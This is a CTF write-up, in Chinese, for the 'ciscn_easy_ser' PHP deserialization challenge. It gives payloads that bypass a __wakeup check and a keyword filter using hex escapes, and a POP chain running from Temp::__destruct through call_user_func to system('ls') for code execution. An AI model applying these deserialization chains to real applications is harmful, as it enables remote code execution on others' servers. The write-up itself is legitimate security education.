# ciscn_easy_ser

index.php:

```
<?php
error_reporting(0);
highlight_file(__FILE__);
class Test{
    public $public_key;
    public $private_key;
    function __wakeup(){
        if($public_key !== $private_key)
        {
            die("You can't");
        }
    }
    function getHint()
    {
        echo file_get_contents('./demo.php');
    }
 
}

$a = $_GET['a'];
if(strpos($a,'key') !== false){
    die("No!!!");
}
else
{
    unserialize($a)();
}
?>
```

（首先部署到我们的服务器上）

一个反序列化，比较奇怪的是unserialize($a)()后面的这个括号

比赛中我想的是将类作为函数调用，会触发`__inoke()`, 而`__wakeup()`用cve去过，然后找个原生类做跳板啥的(当然是没找到)。

我们先做一点小实验：

```
<?php
class Test
{
    public $a;
    public $b;
    function __wakeup()
    {
        // TODO: Implement __wakeup() method.
        echo "__wakeup()\n";
    }
    function __invoke()
    {
        // TODO: Implement __invoke() method.
        echo "__invoke()\n";
    }
    function func()
    {
        echo "func()\n";
    }
}
$a = "Test::func";
$f = serialize($a);
unserialize($f)();//静态调用

$b = new Test();
$c = [$b,'func'];echo $c();
$d = serialize($c);
unserialize($d)();


输出：
func()//来自静态方法调用
func()//来自echo$c()
__wakeup()//来自unserialize()
func()//来自unserialize()
ps:静态方法调用虽然会报错但是仍然会有输出
```

我们发现：

- 静态调用并没有触发__wakeup
- [$b,'func'] ()的形式能够直接调用b对象中的方法func
- [$b,'func'] ()经过反序列化后能够触发__wakeup

因此payload:

```
1.
$a = "Test::getHint";
echo serialize($a);

2.
$test = new Test();
$test->public_key = 1;
$test->private_key = 2;
$a = [$test, 'getHint'];
echo serialize($a);
然后wakeup用string，key用16进制过k::\6b
```

然后进入返回demo.php

control+u查看源码

```php
<?php
class Fake{
	public $firm;
	public $test;
	public function __set($firm,$test){//设置一个类成员变量时调用
	$test = "No,You can't";
	$firm = unserialize($firm);
	call_user_func($firm,$test);
  }
}
class Temp{
	public $pri;
	public $fin=1;
	public function __destruct()
	{
		$a=$this->action;
       $this->pri->$a = $this->fin;
	}

}

class OwO{
    public $fc;
    public $args;	
	function run()
	{

		return ($this->fc)($this->args);

	}
}
$d = $_GET['poc'];
unserialize($d);
?
```

这个就比较正常的pop链了入口__destruction()

```PHP
$a = new Temp();
$b = new OwO();
$c = new Fake();
$b->fc = "system";
$b->args = "ls";
$arr = [$b,'run'];
$d = serialize($arr);
$a->pri = $c;
$a->action = $d;
echo serialize($a);

//具体一点就是：Temp::__destruct->Fake::__set->call_user_func->OwO::run->system('ls')
```

![2](ciscn_easy_ser.assets/2.png)

最后可以看到代码执行。